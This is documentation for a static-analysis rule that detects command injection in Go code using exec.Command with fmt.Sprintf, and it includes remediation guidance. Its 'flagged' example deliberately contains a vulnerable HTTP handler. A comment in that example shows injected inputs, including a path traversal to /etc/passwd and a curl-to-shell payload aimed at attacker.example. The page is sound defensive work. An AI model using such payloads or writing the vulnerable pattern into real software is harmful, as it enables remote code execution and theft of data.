---
title: "VNX-GO-002 – Command Injection via exec.Command"
description: "Detect Go code that passes fmt.Sprintf-formatted strings to exec.Command, enabling command injection when any part of the format string is user-controlled."
---

## Overview

This rule detects calls to `exec.Command` on the same line as `fmt.Sprintf`, which is a strong signal that a shell command string is being constructed from dynamic input and then executed. When any portion of the formatted string originates from user input — a query parameter, form field, environment variable, or file content — an attacker can inject arbitrary operating system commands. This vulnerability is classified as [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html).

**Severity:** High | **CWE:** [CWE-78 – OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

## Why This Matters

OS command injection gives an attacker direct access to the host operating system under the same privileges as the running process. In a cloud or container environment that typically means the ability to read secrets from environment variables or mounted volumes, exfiltrate data, install backdoors, move laterally to other services on the same network, or destroy data. Unlike SQL injection, which is constrained to the database, command injection exposes the entire host. The risk is amplified in Go services that accept external input (web handlers, gRPC services, CLIs) because Go programs often run with elevated container or system privileges.

## What Gets Flagged

The rule fires on any `.go` file where `exec.Command` and `fmt.Sprintf` appear on the same line. The most common pattern is building a shell command string with user-supplied values and passing it to `exec.Command("sh", "-c", ...)` or similar.

```go
// FLAGGED: user input folded into a shell command via fmt.Sprintf
func runReport(w http.ResponseWriter, r *http.Request) {
    name := r.FormValue("filename")
    cmd := exec.Command("sh", "-c", fmt.Sprintf("cat /reports/%s", name))
    out, _ := cmd.Output()
    w.Write(out)
}
// An attacker passes filename=../../etc/passwd or
// filename=foo; curl https://attacker.example/shell | sh
```

## Remediation

1. **Pass arguments as separate parameters to `exec.Command`.** Go's `exec.Command` deliberately separates the executable from its arguments. This completely prevents shell interpretation — no shell is invoked, so metacharacters like `;`, `|`, `&&`, `$()` are treated as literals.

```go
// SAFE: arguments are separate; no shell interpolation occurs
func runReport(w http.ResponseWriter, r *http.Request) {
    name := r.FormValue("filename")
    cmd := exec.Command("cat", "/reports/"+name)
    out, err := cmd.Output()
    if err != nil {
        http.Error(w, "report unavailable", http.StatusInternalServerError)
        return
    }
    w.Write(out)
}
```

2. **Validate input against an allowlist before use.** Even with separate arguments, a path traversal attack is still possible (`../../etc/passwd`). Validate the filename against an allowlist of permitted values, or use `filepath.Clean` combined with a base directory check.

```go
import (
    "path/filepath"
    "strings"
)

func safeReportPath(name string) (string, error) {
    base := "/reports"
    clean := filepath.Clean(filepath.Join(base, name))
    if !strings.HasPrefix(clean, base+string(filepath.Separator)) {
        return "", fmt.Errorf("invalid report name")
    }
    return clean, nil
}
```

3. **Avoid `sh -c` entirely.** Never pass a dynamically constructed string to a shell (`sh -c`, `bash -c`, `cmd /C`). If you need shell features like pipes, implement them natively in Go using `io.Pipe` and multiple `exec.Command` calls connected together.

4. **Consider `exec.LookPath` for explicit binary resolution.** When the executable itself could be influenced by input, use `exec.LookPath` to resolve the binary to an absolute path before executing it.

## References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Go Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Go_Security_Cheat_Sheet.html)
- [Go os/exec package documentation](https://pkg.go.dev/os/exec)
- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
- [MITRE ATT&CK T1059 – Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
